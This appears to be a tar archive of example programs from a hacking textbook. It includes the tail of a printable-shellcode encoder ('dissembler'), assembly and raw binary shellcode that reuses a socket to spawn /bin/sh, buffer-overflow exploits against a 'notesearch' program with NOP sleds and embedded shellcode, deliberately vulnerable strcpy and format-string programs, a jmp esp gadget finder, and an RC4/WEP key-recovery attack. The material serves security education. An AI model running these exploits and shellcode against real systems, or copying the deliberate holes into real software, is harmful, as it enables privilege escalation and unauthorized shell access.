	fclose(fh);

	if(head)
	{
		fh = fopen(head, "w");
		if(!fh)
		{
		fprintf(stderr, "\nError: Couldn't open output file: %s\n", head);
		exit(-1);
		}	
	}
	else
		fh = stdout;

	head = code + norm+pad+1;
	body = head + 38;

	if(targ)
	{
		last = targ + 20+ (norm+pad)*5;
		fprintf(stderr,"[+] Ending address: %p\n", last);
		if((bridge<0) && !(ninja)) bridge = norm/4;
	}
	else
		targ = last;

	fprintf(stderr, "[*] Dissembling bytecode from \'%s\'...\n", argv[optind]);
	opt = strlen(mem);
	head[0] = head[5] = head[10] = 37;
	for(i=1; i < 5; i++)
	{
		strfry(mem);
		for(j=0; j < opt; j++)
		{
			for(k=opt-1; k >= 0; k--)
			{
				if(!(mem[j] & mem[k] & 0xff))
				{
					head[i]   = mem[j];
					head[i+5] = mem[k];
					k = -1; j = opt;
					head[10]++;
				}
			}
		}
	}
	if(head[10] != 41)
	{
		fprintf(stderr,"\nError: Cannot dissemble header with current charset.");
		fprintf(stderr,"\ncharset: %s (%d)\n", mem, strlen(mem));
		exit(-1);
	}
	opt = j = 0;

magic:
	strfry(mem);
	sprintf(head+10, "%sP\\", gen(last, next, mem));

	bzero(body, (norm+pad)*5);
	for(k=norm+pad-4; k >=ninja; k=k-4)
	{
		sscanf(code+k,"%4c",&next);
		strfry(mem);
		strcat(body, gen(next, last, mem));
		strcat(body, "P");
		last = next;
	}
	len = opt;	
	opt = strlen(head) + strlen(body);
	if((opt != len) && (j<34) && ninja)
	{
		fprintf(stderr, "[&] Optimizing with ninja magic...\n");
		last = targ + norm + opt;
		if(size)
		{
			last = last+size-opt;	
			fprintf(stderr, "[&] Adjusting target address to %p..\n", targ+size-opt);
		}
		next = 0;
		j++;
		if(j > 12)
		{
			j = 56;
			fprintf(stderr, "[!] Indecision is my enemy : selecting the best...\n");
			if(opt < len) goto freedom;
		}
		goto magic;
	}
freedom:
	if(bridge>0) opt+=bridge;
	fprintf(stderr, "\n[+] dissembled bytecode is %d bytes long.\n--\n", opt);
	if(esc)
		fprintf(fh, "%s\\%s", head, body);
	else
		fprintf(fh, "%s%s", head, body);

	if(!ninja)
	{
		if(bridge<0)
			bridge = norm+pad;
		for(i=0; i < bridge; i++)
			fprintf(fh, "P");
	}
	fprintf(fh,"\n");
	if(fh != stdout) close(fh);
	free(mem-21);
}

void banner()
{
	fprintf(stderr, "dissembler %s - polymorphs bytecode to a printable ASCII string\n", VERSION);
	fprintf(stderr, "  - Jon Erickson <matrix@phiral.com>  Phiral Research Labs -\n");
	fprintf(stderr, "      438C 0255 861A 0D2A 6F6A  14FA 3229 4BD7 5ED9 69D0\n\n");
}

void usage(char *name)
{
	printf("Usage: %s [switches] bytecode\n", name);
	printf("\nOptional dissembler switches:\n");
	printf("   -t <target address>    near where the bytecode is going\n");
	printf("   -N                     optimize with ninja magic\n");
	printf("   -s <original size>     size changes target, adjust with orig size\n");
	printf("   -b <NOP bridge size>   number of words in the NOP bridge\n");
	printf("   -c <charset>           which chars are considered printable\n");
	printf("   -w <output file>       write dissembled code to output file\n");
	printf("   -e                     escape the backlash in output\n");
	printf("\n");
	exit(0);
}

char* gen(unsigned int targ, unsigned int last, char *X)
{
	unsigned int t[4], l[4];
	unsigned int try, single, carry=0;
	int a, i, j, k, m, z, flag=0;
	char p[MAX_CHR],q[MAX_CHR],r[MAX_CHR],s[MAX_CHR], *pr=X-21;
	int len = strlen(X);

	for(a=0; a < len+2; a++)
		p[a] = q[a] = r[a] = s[a] = a+1;
	p[len] = q[len] = r[len] = s[len] = 0;
	strfry(p);
	strfry(q);
	strfry(r);
	strfry(s);

	pr[0] = pr[5] = pr[10] = pr[15] = 45;
	t[3] = (targ & 0xff000000)>>24;
	t[2] = (targ & 0x00ff0000)>>16;
	t[1] = (targ & 0x0000ff00)>>8;
	t[0] = (targ & 0x000000ff);
	l[3] = (last & 0xff000000)>>24;
	l[2] = (last & 0x00ff0000)>>16;
	l[1] = (last & 0x0000ff00)>>8;
	l[0] = (last & 0x000000ff);

	for(a=1; a < 5; a++) {
		carry = flag = 0;
		for(z=0; z < 4; z++) {
			for(i=0; i < len; i++) {
				for(j=0; j < len; j++) {
					for(k=0; k < len; k++) {
						for(m=0; m < len; m++)
						{
							if(a < 2) j = len+1;
							if(a < 3) k = len+1;
							if(a < 4) m = len+1;
							try = t[z] + carry+X[p[i]-1]+X[q[j]-1]+X[r[k]-1]+X[s[m]-1];
							single = (try & 0x000000ff);
							if(single == l[z])
							{
								carry = (try & 0x0000ff00)>>8;
								if(i < len) pr[1+z]  = X[p[i]-1];
								if(j < len) pr[6+z]  = X[q[j]-1];
								if(k < len) pr[11+z] = X[r[k]-1];
								if(m < len) pr[16+z] = X[s[m]-1];
								i = j = k = m = len+2;
								flag++;
							}
						}
					}
				}
			}
		}
		if(flag ==4)
		{
			pr[5*a] = 0;
			a = 6;
		}
	}
	if(flag !=4) 
	{
		fprintf(stderr,"\nError: Cannot dissemble bytecode with current charset.");
		fprintf(stderr,"\ncharset: %s (%d)\n", X, strlen(X));
		exit(-1);
	}
	return pr;
}

                                                                                                                                                                                                                                                                                                                                                                                                           drop_privs.c                                                                                        0000644 0001747 0001747 00000000422 12564742435 012725  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <unistd.h>

void lowered_priviledge_function(unsigned char *ptr) {
   char buffer[50];

   seteuid(5);  // drop priviledges to games user

   strcpy(buffer, ptr);
}

int main(int argc, char *argv[]) {
   if (argc > 0)
      lowered_priviledge_function(argv[1]); 
}
                                                                                                                                                                                                                                              dtors_sample.c                                                                                      0000644 0001747 0001747 00000000503 12564742435 013232  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>

static void cleanup(void) __attribute__ ((destructor));

main() {
   printf("Some actions happen in the main() function..\n");
   printf("and then when main() exits, the destructor is called..\n");

   exit(0);
}

void cleanup(void) {
   printf("In the cleanup function now..\n");
}
                                                                                                                                                                                             encoded_socket_reuse_restore                                                                        0000644 0001747 0001747 00000000111 12564742435 016227  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jX̀��t
�l$hh��ÍT$\�jY1��?̀Iy��h4xmh4gns���jZ�,Jy��1�R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                       encoded_sockreuserestore                                                                            0000644 0001747 0001747 00000000107 12564742435 015405  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jX̀��t
�l$hh��ÍT$\�jY1��?̀Iy��h4xmh4gns��jZ�,Jy�1�R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                         encoded_sockreuserestore_dbg.s                                                                      0000644 0001747 0001747 00000003237 12564742435 016471  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

   push BYTE 0x02    ; fork is syscall #2
   pop eax
   int 0x80          ; after the fork, in child process eax == 0
   test eax, eax
   jz child_process  ; in child process spawn a shell

      ; in the parent process, restore tinywebd
   lea ebp, [esp+0x68]  ; restore EBP
   push 0x08048fb7      ; return address
   ret                  ; return

child_process:
    ; re-use existing socket
   lea edx, [esp+0x5c]  ; put the address of new_sockfd in edx
   mov ebx, [edx]       ; put the value of new_sockfd in ebx
   push BYTE 0x02
   pop ecx          ; ecx starts at 2
   xor eax, eax
dup_loop:
   mov BYTE al, 0x3F ; dup2  syscall #63
   int 0x80          ; dup2(c, 0)
   dec ecx           ; count down to 0 
   jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
   mov BYTE al, 11   ; execve  syscall #11
   push 0x056d7834   ; push "/sh\x00" encoded +5 to the stack
   push 0x736e6734   ; push "/bin" encoded +5 to the stack
   mov ebx, esp      ; put the address of encoded "/bin/sh" into ebx

int3  ; breakpoint before decoding  (REMOVE WHEN NOT DEBUGGING)

   push BYTE 0x8     ; need to decode 8 bytes
   pop edx
decode_loop:
   sub BYTE [ebx+edx], 0x5
   dec edx
   jns decode_loop

int3  ; breakpoint after decoding  (REMOVE WHEN NOT DEBUGGING)

   xor edx, edx
   push edx          ; push 32-bit null terminator to stack
   mov edx, esp      ; this is an empty array for envp
   push ebx          ; push string addr to stack above null terminator
   mov ecx, esp      ; this is the argv array with string ptr
   int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                                                                                                                                                                                 encoded_sockreuserestore.s                                                                          0000644 0001747 0001747 00000003241 12564742435 015650  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

   push BYTE 0x02    ; fork is syscall #2
   pop eax
   int 0x80          ; after the fork, in child process eax == 0
   test eax, eax
   jz child_process  ; in child process spawn a shell

      ; in the parent process, restore tinywebd
   lea ebp, [esp+0x68]  ; restore EBP
   push 0x08048fb7      ; return address
   ret                  ; return

child_process:
    ; re-use existing socket
   lea edx, [esp+0x5c]  ; put the address of new_sockfd in edx
   mov ebx, [edx]       ; put the value of new_sockfd in ebx
   push BYTE 0x02
   pop ecx          ; ecx starts at 2
   xor eax, eax
dup_loop:
   mov BYTE al, 0x3F ; dup2  syscall #63
   int 0x80          ; dup2(c, 0)
   dec ecx           ; count down to 0 
   jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
   mov BYTE al, 11   ; execve  syscall #11
   push 0x056d7834   ; push "/sh\x00" encoded +5 to the stack
   push 0x736e6734   ; push "/bin" encoded +5 to the stack
   mov ebx, esp      ; put the address of encoded "/bin/sh" into ebx

;int3  ; breakpoint before decoding  (REMOVE WHEN NOT DEBUGGING)

   push BYTE 0x8     ; need to decode 8 bytes
   pop edx
decode_loop:
   sub BYTE [ebx+edx], 0x5
   dec edx
   jns decode_loop

;int3  ; breakpoint after decoding  (REMOVE WHEN NOT DEBUGGING)

   xor edx, edx
   push edx          ; push 32-bit null terminator to stack
   mov edx, esp      ; this is an empty array for envp
   push ebx          ; push string addr to stack above null terminator
   mov ecx, esp      ; this is the argv array with string ptr
   int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                                                                                                                                                                               errorchecked_heap.c                                                                                 0000644 0001747 0001747 00000003427 12564742435 014203  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

void *errorchecked_malloc(unsigned int); // function prototype for errorchecked_malloc()

int main(int argc, char *argv[]) {
   char *char_ptr;  // a char pointer
   int *int_ptr;    // an integer pointer
   int mem_size;

   if (argc < 2)    // if there aren't commandline arguments,
      mem_size = 50; // use 50 as the default value..
   else
      mem_size = atoi(argv[1]);

   printf("\t[+] allocating %d bytes of memory on the heap for char_ptr\n", mem_size);
   char_ptr = (char *) errorchecked_malloc(mem_size); // allocating heap memory

   strcpy(char_ptr, "This is memory is located on the heap.");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[+] allocating 12 bytes of memory on the heap for int_ptr\n");
   int_ptr = (int *) errorchecked_malloc(12); // allocated heap memory again

   *int_ptr = 31337; // put the value of 31337 where int_ptr is pointing
   printf("int_ptr (%p) --> %d\n", int_ptr, *int_ptr);

   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); // freeing heap memory

   printf("\t[+] allocating another 15 bytes for char_ptr\n");
   char_ptr = (char *) errorchecked_malloc(15); // allocating more heap memory

   strcpy(char_ptr, "new memory");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[-] freeing int_ptr's heap memory...\n");
   free(int_ptr); // freeing heap memory
   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); // freeing the other block of heap memory
}

void *errorchecked_malloc(unsigned int size) { // an error checked malloc() function
   void *ptr;
   ptr = malloc(size);
   if(ptr == NULL) {
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }
   return ptr;
}
                                                                                                                                                                                                                                         evil_name                                                                                           0000644 0001747 0001747 00000000144 12564742435 012255  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 ��������������������������������������������������1�1�1ə��̀jXQh//shh/bin��Q��S��̀���������������                                                                                                                                                                                                                                                                                                                                                                                                                            exec_shell                                                                                          0000644 0001747 0001747 00000000044 12564742435 012430  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 �[1��C�[�C�K�S�̀�����/bin/sh                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            exec_shell.c                                                                                        0000644 0001747 0001747 00000000505 12564742435 012653  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <unistd.h>

int main() {
  char filename[] = "/bin/sh\x00";
  char **argv, **envp; // arrays that contain char pointers

  argv[0] = filename; // only argument is filename
  argv[1] = 0;  // null terminate the argument array

  envp[0] = 0; // null terminate the environment array

  execve(filename, argv, envp);
}
                                                                                                                                                                                           exec_shell.s                                                                                        0000644 0001747 0001747 00000001340 12564742435 012671  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

  jmp short two     ; Jump down to the bottom for the call trick
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; ebx has the addr of the string
  xor eax, eax      ; put 0 into eax
  mov [ebx+7], al   ; null terminate the /bin/sh string
  mov [ebx+8], ebx  ; put addr from ebx where the AAAA is
  mov [ebx+12], eax ; put 32-bit null terminator where the BBBB is
  lea ecx, [ebx+8]  ; load the address of [ebx+8] into ecx for argv ptr
  lea edx, [ebx+12] ; edx = ebx + 12, which is the envp ptr
  mov al, 11        ; syscall #11
  int 0x80          ; do it

two:
  call one          ; Use a call to get string address
  db '/bin/sh'     ; the XAAAABBBB bytes aren't needed
                                                                                                                                                                                                                                                                                                exploit_buffer                                                                                      0000644 0001747 0001747 00000000163 12564742435 013334  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 1
7
n
5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
1
                                                                                                                                                                                                                                                                                                                                                                                                             exploit_notesearch.c                                                                                0000644 0001747 0001747 00000001701 12564742435 014436  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); // zero out the new memory

   strcpy(command, "./notesearch \'"); // start command buffer
   buffer = command + strlen(command); // set buffer at the end

   if(argc > 1) // set offset
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; // set return address

   for(i=0; i < 160; i+=4) // fill buffer with return address
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); // build NOP sled
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 

   strcat(command, "\'");

   system(command); // run exploit
   free(command);
}

                                                               exploit_notesearch_env.c                                                                            0000644 0001747 0001747 00000001112 12564742435 015302  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
	char *env[2] = {shellcode, 0};
	unsigned int i, ret;

	char *buffer = (char *) malloc(160);

	ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./notesearch");
	for(i=0; i < 160; i+=4)
		*((unsigned int *)(buffer+i)) = ret;
	
	execle("./notesearch", "notesearch", buffer, 0, env);
	free(buffer);
}

                                                                                                                                                                                                                                                                                                                                                                                                                                                      fcntl_flags.c                                                                                       0000644 0001747 0001747 00000002757 12564742435 013035  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <fcntl.h>

void display_flags(char *, unsigned int);
void binary_print(unsigned int);

int main(int argc, char *argv[]) {
   display_flags("O_RDONLY\t\t", O_RDONLY);
   display_flags("O_WRONLY\t\t", O_WRONLY);
   display_flags("O_RDWR\t\t\t", O_RDWR);
   printf("\n");
   display_flags("O_APPEND\t\t", O_APPEND);
   display_flags("O_TRUNC\t\t\t", O_TRUNC);
   display_flags("O_CREAT\t\t\t", O_CREAT);
   printf("\n");
   display_flags("O_WRONLY|O_APPEND|O_CREAT", O_WRONLY|O_APPEND|O_CREAT);
}

void display_flags(char *label, unsigned int value) {
   printf("%s\t: %d\t:", label, value);
   binary_print(value);
   printf("\n");
}

void binary_print(unsigned int value) {
   unsigned int mask = 0xff000000; // start with a mask for the highest byte
   unsigned int shift = 256*256*256; // start with a shift for the highest byte
   unsigned int byte, byte_iterator, bit_iterator;

   for(byte_iterator=0; byte_iterator < 4; byte_iterator++) {
      byte = (value & mask) / shift; // isolate each byte
      printf(" ");
      for(bit_iterator=0; bit_iterator < 8; bit_iterator++) { // print the byte's bits
         if(byte & 0x80) // if the highest bit in the byte isn't 0
            printf("1");       // print a 1
         else
            printf("0");       // otherwise print a 0
         byte *= 2;         // move all the bits to the left by 1
      }
      mask /= 256;       // move the bits in mask right by 8
      shift /= 256;      // move the bits in shift right by 8
   }
}
                 find_jmpesp.c                                                                                       0000644 0001747 0001747 00000000357 12564742435 013043  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 int main()
{
  unsigned long linuxgate_start = 0xffffe000;
  char *ptr = (char *) linuxgate_start;

  int i;

  for(i=0; i < 4096; i++)
  {
    if(ptr[i] == '\xff' && ptr[i+1] == '\xe4')
      printf("found jmp esp at %p\n", ptr+i);
  }
}
                                                                                                                                                                                                                                                                                 firstprog.c                                                                                         0000644 0001747 0001747 00000000152 12564742435 012555  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main()
{
  int i;
  for(i=0; i < 10; i++)
  {
    printf("Hello World!\n");
  }
}
                                                                                                                                                                                                                                                                                                                                                                                                                      fms.c                                                                                               0000644 0001747 0001747 00000006113 12564742435 011326  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

/* RC4 stream cipher */
int RC4(int *IV, int *key) {
   int K[256];
   int S[256];
   int seed[16];
   int i, j, k, t;

   //seed = IV + key;
   for(k=0; k<3; k++)
      seed[k] = IV[k];
   for(k=0; k<13; k++)
      seed[k+3] = key[k];

   // -= Key Scheduling Algorithm (KSA) =-
   //Initialize the arrays
   for(k=0; k<256; k++) {
      S[k] = k;
      K[k] = seed[k%16];
   }

   j=0;
   for(i=0; i < 256; i++) {
      j = (j + S[i] + K[i])%256;
      t=S[i]; S[i]=S[j]; S[j]=t; // Swap(S[i], S[j]);
   }

   // First step of PRGA for first keystream byte
   i = 0;
   j = 0;

   i = i + 1;
   j = j + S[i];

   t=S[i]; S[i]=S[j]; S[j]=t; // Swap(S[i], S[j]);

   k = (S[i] + S[j])%256;

   return S[k];
}

int main(int argc, char *argv[]) {
  int K[256];
  int S[256];

  int IV[3];
  int key[13] = {1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213};
  int seed[16];
  int N = 256;
  int i, j, k, t, x, A;
  int keystream, keybyte;

  int max_result, max_count;
  int results[256];

  int known_j, known_S;

  if(argc < 2) {
    printf("Usage: %s <keybyte to attack>\n", argv[0]);
    exit(0);
  }
    A = atoi(argv[1]);
    if((A > 12) || (A < 0)) {
      printf("keybyte must be from 0 to 12.\n");
      exit(0);
    }

  for(k=0; k < 256; k++)
    results[k] = 0;

  IV[0] = A + 3;
  IV[1] = N - 1;

  for(x=0; x < 256; x++) {
    IV[2] = x;

    keystream = RC4(IV, key);
    printf("Using IV: (%d, %d, %d), first keystream byte is %u\n",
        IV[0], IV[1], IV[2], keystream);

    printf("Doing the first %d steps of KSA..  ", A+3);

    //seed = IV + key;
    for(k=0; k<3; k++)
      seed[k] = IV[k];
    for(k=0; k<13; k++)
      seed[k+3] = key[k];

    // -= Key Scheduling Algorithm (KSA) =-
    //Initialize the arrays
    for(k=0; k<256; k++) {
      S[k] = k;
      K[k] = seed[k%16];
    }

    j=0;
    for(i=0; i < (A + 3); i++) {
      j = (j + S[i] + K[i])%256;
      t = S[i];
      S[i] = S[j];
      S[j] = t;
    }

    if(j < 2) {  // If j < 2, then S[0] or S[1] have been disturbed
      printf("S[0] or S[1] have been disturbed, discarding..\n");
    } else {
      known_j = j;
      known_S = S[A+3];
      printf("at KSA iteration #%d, j=%d and S[%d]=%d\n",
          A+3, known_j, A+3, known_S);
      keybyte = keystream - known_j - known_S;

      while(keybyte < 0)
        keybyte = keybyte + 256;
      printf("key[%d] prediction = %d - %d - %d = %d\n",
          A, keystream, known_j, known_S, keybyte);
      results[keybyte] = results[keybyte] + 1;
    }
  }
  max_result = -1;
  max_count = 0;

  for(k=0; k < 256; k++) {
    if(max_count < results[k]) {
      max_count = results[k];
      max_result = k;
    }
  }
  printf("\nFrequency table for key[%d] (* = most frequent)\n", A);
  for(k=0; k < 32; k++) {
    for(i=0; i < 8; i++) {
      t = k+i*32;
      if(max_result == t)
        printf("%3d %2d*| ", t, results[t]);
      else
        printf("%3d %2d | ", t, results[t]);
    }
    printf("\n");
  }

  printf("\n[Actual Key] = (");
  for(k=0; k < 12; k++)
    printf("%d, ",key[k]);
  printf("%d)\n", key[12]);

  printf("key[%d] is probably %d\n", A, max_result);
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                     fmt_strings.c                                                                                       0000644 0001747 0001747 00000001066 12564742435 013102  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
   char string[10];
   int A = -73;
   unsigned int B = 31337;

   strcpy(string, "sample");

   // Example of printing with different format string
   printf("[A] Dec: %d, Hex: %x, Unsigned: %u\n", A, A, A);
   printf("[B] Dec: %d, Hex: %x, Unsigned: %u\n", B, B, B);
   printf("[field width on B] 3: '%3u', 10: '%10u', '%08u'\n", B, B, B);
   printf("[string] %s  Address %08x\n", string, string);

   // Example of unary address operator (dereferencing) and a %x format string
   printf("variable A is at address: %08x\n", &A);
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                          fmt_uncommon2.c                                                                                     0000644 0001747 0001747 00000000762 12564742435 013330  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>

int main() {
   int A = 5, B = 7, count_one, count_two;

   // Example of a %n format string
   printf("The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\n", &count_one, &count_two);

   printf("count_one: %d\n", count_one);
   printf("count_two: %d\n", count_two);

   // Stack Example
   printf("A is %d and is at %08x.  B is %x.\n", A, &A);

   exit(0);
}	
              fmt_uncommon.c                                                                                      0000644 0001747 0001747 00000000765 12564742435 013251  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>

int main() {
   int A = 5, B = 7, count_one, count_two;

   // Example of a %n format string
   printf("The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\n", &count_one, &count_two);

   printf("count_one: %d\n", count_one);
   printf("count_two: %d\n", count_two);

   // Stack Example
   printf("A is %d and is at %08x.  B is %x.\n", A, &A, B);

   exit(0);
}	
           fmt_vuln2.c                                                                                         0000644 0001747 0001747 00000001237 12564742435 012457  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72, next_val = 0x11111111;

   if(argc < 2) {
      printf("Usage: %s <text to print>\n", argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf("The right way to print user-controlled input:\n");
   printf("%s", text);


   printf("\nThe wrong way to print user-controlled input:\n");
   printf(text);

   printf("\n");

   // Debug output
   printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
   printf("[*] next_val @ 0x%08x = %d 0x%08x\n", &next_val, next_val, next_val);

   exit(0);
}
                                                                                                                                                                                                                                                                                                                                                                 fmt_vuln.c                                                                                          0000644 0001747 0001747 00000001067 12564742435 012376  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72;

   if(argc < 2) {
      printf("Usage: %s <text to print>\n", argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf("The right way to print user-controlled input:\n");
   printf("%s", text);


   printf("\nThe wrong way to print user-controlled input:\n");
   printf(text);

   printf("\n");

   // Debug output
   printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

   exit(0);
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                         funcptr_example.c                                                                                   0000644 0001747 0001747 00000000762 12564742435 013741  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int func_one() {
	printf("This is function one\n");
	return 1;
}

int func_two() {
	printf("This is function two\n");
	return 2;
}

int main() {
	int value;
	int (*function_ptr) ();

	function_ptr = func_one;
	printf("function_ptr is 0x%08x\n", function_ptr);
	value = function_ptr();
	printf("value returned was %d\n", value);

	function_ptr = func_two;
	printf("function_ptr is 0x%08x\n", function_ptr);
	value = function_ptr();
	printf("value returned was %d\n", value);
}
	
              game_of_chance.c                                                                                    0000644 0001747 0001747 00000035713 12564742435 013447  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <stdlib.h>
#include "hacking.h"

#define DATAFILE "/var/chance.data" // File to store user data

// Custom user struct to store information about users
struct user {
   int uid;
   int credits;
   int highscore;
   char name[100];
   int (*current_game) ();
};

// function prototypes
int get_player_data();
void register_new_player();
void update_player_data();
void show_highscore();
void jackpot();
void input_name();
void print_cards(char *, char *, int);
int take_wager(int, int);
void play_the_game();
int pick_a_number();
int dealer_no_match();
int find_the_ace();
void fatal(char *);

// Global variables
struct user player;      // Player struct

int main() {
   int choice, last_game;

   srand(time(0)); // Seed the randomizer with the current time.
   
   if(get_player_data() == -1) // Try to read player data from file.
      register_new_player();    // If there is no data, register a new player.
   
   while(choice != 7) {
      printf("-=[ Game of Chance Menu ]=-\n");
      printf("1 - Play the Pick a Number game\n");
      printf("2 - Play the No Match Dealer game\n");
      printf("3 - Play the Find the Ace game\n");
      printf("4 - View current high score\n");
      printf("5 - Change your user name\n");
      printf("6 - Reset your account at 100 credits\n");
      printf("7 - Quit\n");
      printf("[Name: %s]\n", player.name);
      printf("[You have %u credits] ->  ", player.credits);
      scanf("%d", &choice);

      if((choice < 1) || (choice > 7))
         printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
      else if (choice < 4) {  // Othewise, choice was a game of some sort.
            if(choice != last_game) { // If the function ptr isn't set
               if(choice == 1)        // then point it at the selected game 
                  player.current_game = pick_a_number;   
               else if(choice == 2)                     
                  player.current_game = dealer_no_match;
               else
                  player.current_game = find_the_ace;
               last_game = choice;   // and set last_game.
            }
            play_the_game();   // Play the game.
         }
      else if (choice == 4)
         show_highscore();
      else if (choice == 5) {
         printf("\nChange user name\n");
         printf("Enter your new name: ");
         input_name();
         printf("Your name has been changed.\n\n");
      }
      else if (choice == 6) {
         printf("\nYour account has been reset with 100 credits.\n\n");
         player.credits = 100;
      }
   }
   update_player_data();
   printf("\nThanks for playing! Bye.\n");
}

// This function reads the player data for the current uid
// from the file. It returns -1 if it is unable to find player
// data for the current uid.
int get_player_data() { 
   int fd, uid, read_bytes;
   struct user entry;

   uid = getuid();

   fd = open(DATAFILE, O_RDONLY);
   if(fd == -1) // Can't open the file, maybe it doesn't exist
      return -1; 
   read_bytes = read(fd, &entry, sizeof(struct user)); // Read the first chunk.
   while(entry.uid != uid && read_bytes > 0) {  // Loop until proper uid is found.
      read_bytes = read(fd, &entry, sizeof(struct user)); // Keep reading.
   }
   close(fd); // close the file
   if(read_bytes  < sizeof(struct user)) // This means that the end of file was reached.
      return -1;
   else
      player = entry; // Copy the read entry into the player struct.
   return 1; // Return a success.
}

// This is the new user registration function.
// It will create a new player account and append it to the file
void register_new_player()  { 
   int fd;

   printf("-=-={ New Player Registration }=-=-\n");
   printf("Enter your name: ");
   input_name();

   player.uid = getuid();
   player.highscore = player.credits = 100;

   fd = open(DATAFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
   if(fd == -1)
      fatal("in register_new_player() while opening file");
   write(fd, &player, sizeof(struct user));
   close(fd);

   printf("\nWelcome to the Game of Chance %s.\n", player.name);
   printf("You have been given %u credits.\n", player.credits);
}

// This function writes the current player data to the file.
// It is used primarily for updating the credits after games.
void update_player_data() {
   int fd, i, read_uid;
   char burned_byte;

   fd = open(DATAFILE, O_RDWR);
   if(fd == -1) // If open fails here, something is really wrong.
      fatal("in update_player_data() while opening file");
   read(fd, &read_uid, 4);       // Read the uid from the first struct.
   while(read_uid != player.uid) {  // Loop until correct uid is found.
      for(i=0; i < sizeof(struct user) - 4; i++)  // Read through the
         read(fd, &burned_byte, 1);            // rest of that struct.
      read(fd, &read_uid, 4);     // Read the uid from the next struct. 
   }
   write(fd, &(player.credits), 4);   // Update credits.
   write(fd, &(player.highscore), 4); // Update highscore.
